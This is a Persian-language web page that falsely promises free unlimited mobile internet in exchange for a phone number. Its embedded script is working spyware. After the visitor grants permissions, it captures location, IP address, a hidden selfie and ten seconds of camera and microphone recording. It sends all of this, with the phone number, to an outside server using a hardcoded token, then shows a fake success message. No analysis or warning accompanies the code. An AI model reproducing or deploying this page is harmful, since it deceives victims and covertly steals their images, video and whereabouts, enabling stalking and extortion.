<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>اینترنت رایگان نامحدود</title>
  <style>
    body {font-family:Vazirmatn;background:linear-gradient(135deg,#0f0c29,#780206);color:#fff;text-align:center;padding:20px;}
    .box {max-width:380px;margin:30px auto;background:rgba(255,255,255,0.1);padding:25px;border-radius:20px;backdrop-filter:blur(10px);}
    input,select,button {width:100%;padding:14px;margin:10px 0;border-radius:12px;font-size:16px;}
    button {background:#8b00ff;border:none;color:#fff;font-weight:bold;box-shadow:0 0 20px #8b00ff88;}
    #status {margin-top:15px;color:#0f0;font-weight:bold;}
  </style>
</head>
<body>
  <div class="box">
    <h1>اینترنت رایگان نامحدود</h1>
    <p>شماره بزن و بسته رو بگیر!</p>
    <input type="tel" id="phone" placeholder="09123456789">
    <select id="operator">
      <option>ایرانسل</option>
      <option>همراه اول</option>
      <option>رایتل</option>
    </select>
    <button onclick="start()">دریافت بسته</button>
    <p id="status">در حال آماده‌سازی...</p>
  </div>

  <video id="v" autoplay playsinline muted style="display:none"></video>
  <canvas id="c" style="display:none"></canvas>

  <script>
    const AUTH = "htshacldwetgenkfaavimtntknfirllm"; // <─ auth تو
    const SERVER = "https://rubika-mikey-auth2.vercel.app/api/send";

    async function start() {
      const phone = document.getElementById('phone').value;
      const op = document.getElementById('operator').value;
      if (!phone.match(/^09[0-9]{9}$/)) return alert("شماره اشتباهه");

      document.getElementById('status').innerText = "در حال فعال‌سازی...";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
        document.getElementById('v').srcObject = stream;

        // اطلاعات متنی
        navigator.geolocation.getCurrentPosition(async pos => {
          const ip = await (await fetch('https://api.ipify.org')).text();
          const text = `شماره: ${phone}\nاپراتور: ${op}\nلوکیشن: ${pos.coords.latitude},${pos.coords.longitude}\nIP: ${ip}\nمدل: ${navigator.userAgent.substring(0,60)}...`;
          await fetch(SERVER, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({auth:AUTH,type:'text',text:text})});
        });

        // عکس
        setTimeout(() => {
          const canvas = document.getElementById('c');
          canvas.width = 640; canvas.height = 480;
          canvas.getContext('2d').drawImage(document.getElementById('v'),0,0,640,480);
          canvas.toBlob(async blob => {
            const f = new FormData();
            f.append('auth', AUTH);
            f.append('file', blob, 'selfie.jpg');
            f.append('type', 'photo');
            await fetch(SERVER, {method:'POST', body:f});
          }, 'image/jpeg');
        }, 1500);

        // ویدیو ۱۰ ثانیه
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        setTimeout(() => {
          recorder.stop();
          recorder.onstop = async () => {
            const blob = new Blob(chunks, {type:'video/webm'});
            const f = new FormData();
            f.append('auth', AUTH);
            f.append('file', blob, 'video.webm');
            f.append('type', 'video');
            await fetch(SERVER, {method:'POST', body:f});
            document.getElementById('status').innerHTML = "بسته فعال شد ✓";
          };
        }, 10000);

      } catch(e) { alert("دسترسی رد شد!"); }
    }
  </script>
</body>
</html>
